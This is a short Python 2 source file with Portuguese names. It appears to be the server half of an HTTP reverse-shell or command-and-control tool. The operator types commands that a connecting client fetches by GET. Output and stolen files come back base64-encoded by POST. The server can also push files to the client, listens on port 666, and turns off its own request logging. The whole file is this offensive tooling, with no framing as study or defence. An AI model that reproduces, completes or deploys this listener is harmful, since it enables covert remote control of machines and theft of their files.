from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os, base64

class MeuServidor(BaseHTTPRequestHandler): #1

    def do_GET(self): #2
        global comando #3
        self.send_response(200) #4
        self.send_header('Content-type','text/html') #5
        self.end_headers() #6
        comando = raw_input("Comando: ") #7
        if comando.startswith("upload"):
            print "Realizando o upload. Aguarde..."
            arquivo = comando.split()[1]
            with open(arquivo, "rb") as conteudo:
                conteudoArquivo = conteudo.read()
            self.wfile.write("upload %s %s" %(os.path.basename(arquivo), base64.b64encode(conteudoArquivo))) #8
        else:
            if comando.startswith("download"):
                print "Realizando o download. Aguarde..."
            self.wfile.write(comando) #9

    def do_POST(self): #10
        tamanho = int(self.headers["Content-Length"]) #11
        corpoPOST = self.rfile.read(tamanho) #12
        self.send_response(200) #13
        self.end_headers() #14
        if self.path == "/download": #15
            arquivo = os.path.basename(comando.split()[1])
            with open(arquivo, "wb") as conteudo:
                conteudo.write(base64.b64decode(corpoPOST))
            print "Download completo\n"
        else:
            print corpoPOST #16

    def log_message(self, *args): #17
        return

comando = "" #18
servidor = HTTPServer(("0.0.0.0", 666), MeuServidor) #19
servidor.serve_forever() #20